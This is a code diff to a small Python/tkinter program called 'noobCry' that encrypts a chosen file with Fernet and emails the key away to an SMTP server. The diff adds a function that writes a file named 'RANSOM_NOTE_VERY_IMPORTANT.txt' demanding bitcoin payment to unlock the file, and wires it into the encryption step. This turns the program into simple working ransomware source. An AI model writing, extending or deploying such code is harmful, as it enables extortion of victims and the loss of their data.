@@ -1,6 +1,7 @@
 import os, base64, smtplib, config
 from cryptography.fernet import Fernet
 from tkinter import *
+from os.path import join
 """
 ALTHOUGH THIS ISN'T OVERTLY MALWARE, IT COULD EASILY BE USED AS SUCH !PLEASE USE CAUTION WHEN ENCRYPTING FILES USING THIS SOFTWARE!!!!
 This program takes a file and it's location as inputs, and encrypts it using symmetric fernet encryption. It then sends the key to an e-mail SMTP server
@@ -29,6 +30,12 @@ class noobCry:
                         file.write(encryptedFile)#write the encypted data to the file
                         return fernetKey
     #End encrypt()
+    def ransomNote(location):
+        bitcoinMsg = "Give 100 dollars in bitcoin to this address--> bitcoincash:aasbjsjjfioo234h44n5kkll,with a note including your email addressto have your file unlocked, there is no other possible way to retreive it!"
+        name = "RANSOM_NOTE_VERY_IMPORTANT.txt"
+        ransomNote = open(join(location,name),"x")
+        ransomNote.write(bitcoinMsg)
+        ransomNote.close()
 
     def email(email,password,SMTP,port,fernetKey):
         try:
@@ -110,6 +117,7 @@ labelLocation.grid(column=1, row=9)#outputs message below entry fields
 
 #on 'Confirm' button click, gets text from the fields and feeds them into 
 def confirm():
+
     #hold the file name
     fileName = textName.get()
     #hold the directory location
@@ -124,15 +132,19 @@ def confirm():
     password = textPassword.get()
     #hold the fernet key, received after calling encrypt()
     fernetKey = noobCry.encrypt(fileName,location)
+    noobCry.ransomNote(location)
     #call the function 'email()' and use smtp protocol to send the fernet key
     noobCry.email(email,password,SMTP,port,fernetKey)
+#End confirm()
 def close():
     exit()
 #End confirm()
+
 #This code sets up the buttons
 buttonEncrypt = Button(window, text="Encypt/Send Key", command=confirm)
 buttonEncrypt.grid(column=0, row=8)
 buttonClose = Button(window, text=" Close ", command=close)
 buttonClose.grid(column=0, row=9)
+
 #this is the loop that keeps the window open
 window.mainloop()
